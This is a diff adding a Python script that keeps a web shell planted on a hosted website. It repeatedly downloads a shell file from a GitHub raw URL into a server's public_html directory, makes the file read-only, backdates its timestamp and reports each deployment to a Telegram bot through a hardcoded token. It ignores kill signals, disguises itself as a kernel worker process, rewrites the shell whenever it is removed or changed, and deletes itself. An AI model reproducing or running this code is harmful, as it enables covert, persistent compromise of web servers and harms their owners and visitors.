@@ -1,0 +1,217 @@
+import os
+import time
+import sys
+import signal
+import urllib.request
+import urllib.parse
+import subprocess
+import hashlib
+from datetime import datetime
+
+CONFIG = {
+    "RAW_SHELL_URL": "https://raw.githubusercontent.com/la-inca/clev/refs/heads/main/hapus23.txt",
+    "BOT_TOKEN": os.getenv("BOT_TOKEN", "8559074485:AAGMwVw5bm-RNvckM4_F5vbU0Gijy7FKtwo"),
+    "CHAT_ID": os.getenv("CHAT_ID", "-1003217853706"),
+    "TARGET_DIR": "/mnt/BLOCKSTORAGE/home/229160.cloudwaysapps.com/erwfufpvdy/public_html/public",
+    "FILE_NAME": "jtest1.php",
+    "TIMESTAMP": "202401172207.59",
+    "TIMEOUT": 10,
+    "POLL_INTERVAL": 2,
+    "REDEPLOY_COOLDOWN": 10
+}
+
+TARGET_DIR = os.path.abspath(CONFIG["TARGET_DIR"])
+FILE_PATH = os.path.join(TARGET_DIR, CONFIG["FILE_NAME"])
+SELF_PATH = os.path.abspath(__file__)
+
+current_file_hash = None
+domain = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "https://parasitetesting.com/mics"
+last_redeploy_time = 0
+
+def ignore_signal(signum, frame):
+    pass
+
+for sig in [signal.SIGTERM, signal.SIGINT, signal.SIGHUP, signal.SIGQUIT, signal.SIGTSTP]:
+    try:
+        signal.signal(sig, ignore_signal)
+    except:
+        pass
+
+try:
+    os.nice(19)
+    os.execl(sys.executable, "[kworker/0:1]", *sys.argv)
+except:
+    pass
+sys.argv[0] = "[kworker/0:1]"
+
+def kirim_telegram(message):
+    url = f"https://api.telegram.org/bot{CONFIG['BOT_TOKEN']}/sendMessage"
+    data = urllib.parse.urlencode({
+        "chat_id": CONFIG["CHAT_ID"],
+        "parse_mode": "Markdown",
+        "text": message
+    }).encode('ascii')
+    try:
+        req = urllib.request.Request(url, data=data, method='POST')
+        urllib.request.urlopen(req, timeout=CONFIG["TIMEOUT"])
+    except:
+        pass
+
+def get_file_hash(path):
+    try:
+        with open(path, 'rb') as f:
+            return hashlib.sha256(f.read()).hexdigest()
+    except:
+        return None
+
+def ensure_target_dir():
+    try:
+        os.makedirs(TARGET_DIR, exist_ok=True)
+        return True
+    except:
+        return False
+
+def download_bytes():
+    try:
+        with urllib.request.urlopen(CONFIG["RAW_SHELL_URL"], timeout=CONFIG["TIMEOUT"]) as resp:
+            data = resp.read()
+            if data:
+                return data
+    except:
+        pass
+    # fallback to curl (write to stdout capture)
+    try:
+        result = subprocess.run(
+            ["curl", "-s", "-L", CONFIG["RAW_SHELL_URL"]],
+            capture_output=True, timeout=CONFIG["TIMEOUT"]
+        )
+        if result.returncode == 0 and result.stdout:
+            return result.stdout
+    except:
+        pass
+    return None
+
+def parse_config_timestamp(ts_str):
+    patterns = [
+        "%Y-%m-%d %H:%M:%S",
+        "%Y%m%d%H%M.%S",
+        "%Y%m%d%H%M%S",
+        "%Y-%m-%dT%H:%M:%S"
+    ]
+    for p in patterns:
+        try:
+            return datetime.strptime(ts_str, p)
+        except:
+            continue
+    try:
+        if ts_str.isdigit():
+            return datetime.fromtimestamp(int(ts_str))
+    except:
+        pass
+    return datetime.now()
+
+def write_bytes_direct(path, data_bytes):
+    """Write bytes directly to path (no temp). Uses fsync to reduce corruption risk."""
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, 'wb') as f:
+        f.write(data_bytes)
+        f.flush()
+        try:
+            os.fsync(f.fileno())
+        except:
+            pass
+    try:
+        os.chmod(path, 0o444)
+    except:
+        pass
+
+def deploy_if_needed_memory():
+    global current_file_hash, last_redeploy_time
+    cooldown = CONFIG.get("REDEPLOY_COOLDOWN", 10)
+    if time.time() - last_redeploy_time < cooldown:
+        return
+
+    if not ensure_target_dir():
+        kirim_telegram(f"⚠️ Gagal membuat folder target: `{TARGET_DIR}`")
+        return
+
+    data = download_bytes()
+    if data is None:
+        return
+
+    new_hash = hashlib.sha256(data).hexdigest()
+    existing_hash = get_file_hash(FILE_PATH)
+
+    if existing_hash is None or new_hash != existing_hash:
+        try:
+            write_bytes_direct(FILE_PATH, data)
+            current_file_hash = new_hash
+            last_redeploy_time = time.time()
+
+            dt = parse_config_timestamp(CONFIG.get("TIMESTAMP", ""))
+            human_ts = dt.strftime('%Y-%m-%d %H:%M:%S')
+            try:
+                os.utime(FILE_PATH, (dt.timestamp(), dt.timestamp()))
+            except:
+                pass
+
+            relative = os.path.basename(FILE_PATH)
+            url = f"{domain}/{relative}"
+            kirim_telegram(f"""✅ *LP succeded subham gandu!*
+📁 Path: `{FILE_PATH}`
+🌍 URL: `{url}`
+🕒 Waktu: {human_ts}""")
+        except Exception:
+            # kalau gagal tulis, jangan spam notification
+            return
+    else:
+        # isi sama -> nothing to do
+        current_file_hash = existing_hash
+
+def check_file_changes_loop():
+    global current_file_hash
+    exists = os.path.exists(FILE_PATH)
+    if not exists:
+        deploy_if_needed_memory()
+        return
+
+    if current_file_hash is None:
+        current_file_hash = get_file_hash(FILE_PATH)
+        return
+
+    on_disk_hash = get_file_hash(FILE_PATH)
+    if on_disk_hash != current_file_hash:
+        deploy_if_needed_memory()
+
+def self_destruct():
+    try:
+        with open(SELF_PATH, 'a'):
+            pass
+        subprocess.run(["rm", "-f", SELF_PATH], timeout=2)
+    except:
+        pass
+
+def main():
+    if not domain:
+        self_destruct()
+        return
+
+    ensure_target_dir()
+    global current_file_hash
+    current_file_hash = get_file_hash(FILE_PATH)
+
+    if current_file_hash is None:
+        deploy_if_needed_memory()
+
+    while True:
+        try:
+            check_file_changes_loop()
+        except Exception:
+            pass
+        time.sleep(CONFIG["POLL_INTERVAL"])
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        self_destruct()
